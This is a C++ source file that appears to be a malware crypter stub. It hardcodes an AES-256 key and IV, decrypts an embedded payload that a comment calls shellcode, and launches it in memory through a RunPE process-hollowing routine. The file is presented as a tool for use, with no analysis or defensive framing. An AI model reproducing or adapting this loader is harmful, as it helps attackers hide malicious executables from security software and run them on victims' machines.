#define _CRT_SECURE_NO_WARNINGS

#include "runpe.h"
#include "output.h"
#include <thread>
#include <fstream>
#include <vector>
#include <random>
#include "../plusaes.hpp"
//              _       _         _     
//             | |     | |       | |    
//   __ _ _ __ | |_ ___| |_ _   _| |__  
//  / _` | '_ \| __/ __| __| | | | '_ \ 
// | (_| | |_) | |_\__ \ |_| |_| | |_) |
//  \__, | .__/ \__|___/\__|\__,_|_.__/ 
//   __/ | |                            
//  |___/|_|                            

std::string generate_random_string() {
	const std::string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	const int len = 16;
	std::string result;

	std::random_device rd;
	std::mt19937 gen(rd());
	std::uniform_int_distribution<> distrib(0, charset.length() - 1);

	for (int i = 0; i < len; ++i) {
		result += charset[distrib(gen)];
	}

	return result;
}

std::vector<char> getarrasvector() {
	std::vector<char> buf{ };
	for (size_t i = 0; i < 10256; i++)
	{
		auto v = [&]() {
			__try {
				buf.push_back(data[i]);
				return 0;
			}
			__except (1) { return 1; }
		};
		if (v()) break;
	}
	return buf;
}

std::vector<char>::const_iterator find_pattern(const std::vector<char>& data)
{
	const char* target = "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	auto target_size = 120; //std::strlen(target);

	auto iter = std::search(data.begin(), data.end(), target, target + target_size);

	if (iter != data.end()) {
		return iter;
	}
	else {
		return data.end();
	}
}

int main() {
	//printf("entry");

	const std::vector<unsigned char> key = plusaes::key_from_string(&"K9VR3bmIOWVa8MCSzPb5wafNCvF4O1yD"); // 32-char = 128-bit

	const unsigned char iv[16] = { 'i', 'v', 'f', 'o', 'r', 'a', 'e', 's', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'r' };

	//check shellcode isnt empty lol
	int c = 0;
	for (size_t i = 4; i < 1024; i++) 
		if (data[i] != 0) {
			c++;
			break;
		}
	if (!c) return 1;


	//auto result = AES256::decrypt(getarrasvector(), in, iv);
	//auto result = data;

	int sz = sizeof(data) / sizeof(data[0]);
	std::vector<char> v{};
	for (size_t i = 0; i < sz; i++)
		v.push_back(data[i]);
	auto iter = find_pattern(v);

	if (iter != v.end())
		sz = std::distance<std::vector<char>::const_iterator>(v.begin(), iter);

	unsigned long padded_size = 0;
	std::vector<unsigned char> decrypted(sz);

	plusaes::decrypt_cbc(&data[0], sz, &key[0], 32, &iv, &decrypted[0], decrypted.size(), &padded_size);

	DWORD dwRet = 0;

	PROCESS_INFORMATION stPI;
	ZeroMemory(&stPI, sizeof stPI);
	STARTUPINFO stSI;
	ZeroMemory(&stSI, sizeof stSI);
	WCHAR szArgs[] = L"";

	if (!runPE64(
		&stPI,
		&stSI,
		reinterpret_cast<LPVOID>(decrypted.data()),
		szArgs,
		sizeof szArgs
	))
	{
		//WaitForSingleObject(
		//	stPI.hProcess,
		//	INFINITE
		//);
		//
		//GetExitCodeProcess(
		//	stPI.hProcess,
		//	&dwRet
		//);
		//
		CloseHandle(stPI.hThread);
		CloseHandle(stPI.hProcess);
	}
	
	//printf("end");

	return 1;
}